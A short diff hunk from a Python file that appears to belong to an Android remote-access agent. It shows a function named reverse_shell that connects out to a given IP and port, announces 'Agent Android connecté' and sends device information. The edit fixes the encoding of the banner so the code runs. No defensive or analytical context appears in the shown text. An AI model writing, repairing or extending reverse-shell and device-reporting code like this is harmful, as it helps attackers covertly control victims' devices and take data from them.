@@ -44,7 +44,7 @@ def reverse_shell(ip: str, port: int):
     try:
         sock = socket.socket()
         sock.connect((ip, port))
-        sock.send(b"[+] Agent Android connecté.\n")
+        sock.send("[+] Agent Android connecté.\n".encode('utf-8'))
 
         send_device_info(sock)
 
